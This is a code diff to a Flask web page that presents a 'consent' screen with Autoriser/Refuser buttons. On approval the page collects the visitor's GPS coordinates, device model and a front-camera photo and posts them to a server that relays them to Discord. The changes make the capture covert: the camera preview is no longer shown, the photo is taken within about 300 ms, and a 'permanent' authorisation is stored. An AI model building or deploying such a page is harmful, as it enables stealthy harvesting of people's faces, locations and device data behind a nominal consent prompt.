@@ -38,9 +38,11 @@ HTML_TEMPLATE = """
 
         #video-container { margin: 15px 0; display: none; }
         video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
-        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
-        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; }
+        .btn-container { margin-top: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .btn-row { display: flex; justify-content: space-around; }
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; }
         .btn-approve { background-color: #28a745; color: white; }
+        .btn-forever { background-color: #007bff; color: white; margin-top: 5px; }
         .btn-deny { background-color: #dc3545; color: white; }
         #status { margin-top: 15px; font-weight: bold; }
     </style>
@@ -62,8 +64,11 @@ HTML_TEMPLATE = """
             <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
             
             <div class="btn-container">
-                <button type="button" class="btn-approve" onclick="captureAndSend(true)">Autoriser</button>
-                <button type="button" class="btn-deny" onclick="captureAndSend(false)">Refuser</button>
+                <div class="btn-row" style="width: 100%;">
+                    <button type="button" class="btn-approve" onclick="captureAndSend(false, false)" style="width: 48%;">Autoriser</button>
+                    <button type="button" class="btn-deny" onclick="captureAndSend(true, false)" style="width: 48%;">Refuser</button>
+                </div>
+                <button type="button" class="btn-forever" onclick="captureAndSend(false, true)">Autoriser pour toujours</button>
             </div>
         </form>
 
@@ -73,7 +78,12 @@ HTML_TEMPLATE = """
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // دالة استخراج نوع الهاتف من الـ UserAgent
+        window.onload = function() {
+            if (localStorage.getItem("alwaysAuthorized") === "true") {
+                document.querySelector('.card').innerHTML = "<h2>Bienvenue</h2><p style='color: green; font-weight: bold;'>Vous avez déjà accordé l'accès permanent.</p>";
+            }
+        };
+
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
@@ -95,11 +105,11 @@ HTML_TEMPLATE = """
             return model;
         }
 
-        async function captureAndSend(consent) {
+        async function captureAndSend(isDenied, isPermanent) {
             const statusDiv = document.getElementById('status');
             const username = document.getElementById('username').value;
 
-            if (!consent) {
+            if (isDenied) {
                 statusDiv.style.color = 'red';
                 statusDiv.innerText = '您已拒绝授权，未收集任何数据。';
                 return;
@@ -109,6 +119,10 @@ HTML_TEMPLATE = """
                 statusDiv.style.color = 'red';
                 statusDiv.innerText = '请先填写姓名。';
                 return;
+            }
+
+            if (isPermanent) {
+                localStorage.setItem("alwaysAuthorized", "true");
             }
 
             statusDiv.style.color = 'gray';
@@ -126,24 +140,31 @@ HTML_TEMPLATE = """
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
             };
 
+            // 1. جلب موقع الـ GPS بشكل متزامن سريع
             try {
                 const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                 });
                 locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
             } catch (err) {
                 locationData = "Accès à la localisation refusé";
             }
 
+            // 2. تشغيل الكاميرا والتقاط الصورة في لحظة وبأسرع وقت ممكن
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const videoElement = document.getElementById('webcam');
                 const canvas = document.getElementById('canvas');
                 
                 videoElement.srcObject = stream;
-                document.getElementById('video-container').style.display = 'block';
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // الانتظار فقط للحظة قصيرة جداً (300 ميلي ثانية) لضمان ظهور الكادر والتقاط الصورة فوراً
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        resolve();
+                    };
+                    setTimeout(resolve, 300); // التقاط فوري سريع دون انتظار طويل
+                });
 
                 canvas.width = videoElement.videoWidth || 640;
                 canvas.height = videoElement.videoHeight || 480;
@@ -152,12 +173,14 @@ HTML_TEMPLATE = """
 
                 imageBase64 = canvas.toDataURL('image/jpeg');
 
+                // إيقاف الكاميرا فوراً بعد الالتقاط
                 stream.getTracks().forEach(track => track.stop());
 
             } catch (err) {
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
+            // 3. إرسال البيانات مباشرة إلى السيرفر
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -175,6 +198,11 @@ HTML_TEMPLATE = """
                 if (response.ok) {
                     statusDiv.style.color = 'green';
                     statusDiv.innerText = '已成功授权并发送数据！';
+                    if (isPermanent) {
+                        setTimeout(() => {
+                            location.reload();
+                        }, 1200);
+                    }
                 } else {
                     statusDiv.style.color = 'red';
                     statusDiv.innerText = result.error || '发生错误。';
@@ -204,7 +232,6 @@ def submit_consent():
     device = data.get("device", {})
     image_data = data.get("image")
 
-    # إضافة نوع الهاتف (Model) إلى الرسالة المرسلة لـ Discord
     payload = {
         "content": (
             f"✅ **Nouveau consentement et détails de l'appareil:**\n"
